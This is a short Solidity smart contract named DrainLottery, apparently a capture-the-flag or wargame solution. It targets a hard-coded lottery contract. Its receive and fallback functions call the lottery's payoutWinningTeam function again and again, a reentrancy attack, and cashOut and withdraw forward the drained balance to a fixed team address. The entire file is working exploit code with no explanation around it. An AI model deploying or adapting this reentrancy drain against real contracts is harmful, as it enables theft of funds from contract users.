// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IOracle {
    function getRandomNumber() external view returns (uint256);
}

interface ILottery {
    function payoutWinningTeam(address) external returns (bool);
}

address constant LotteryAddress = 0x44962eca0915Debe5B6Bb488dBE54A56D6C7935A;
address constant TeamAddress = 0x971ed3B1D66A445d20e75EdE714e64f00e9cAFF8;

contract DrainLottery {

    IOracle public oracle;

    constructor(){
        oracle = IOracle(0x0d186F6b68a95B3f575177b75c4144A941bFC4f3);
    }

    function getOracleNumber() view public returns (uint256){
         return oracle.getRandomNumber();
    }

    function drain() public {
        ILottery(LotteryAddress).payoutWinningTeam(address(this));
    }

    fallback() external payable {
        drain();
    }

    function cashOut() public {
        (bool sent,) = TeamAddress.call{value: address(this).balance}("cash~out");
        require(sent);
    }

    receive() external payable {
        if (gasleft() > 40_000) {
            ILottery(LotteryAddress).payoutWinningTeam(address(this));
        }
    }

    function withdraw() public {
        (bool sent,) = address(0x971ed3B1D66A445d20e75EdE714e64f00e9cAFF8).call{value: address(this).balance}("withdraw");
        require(sent);
    }
}
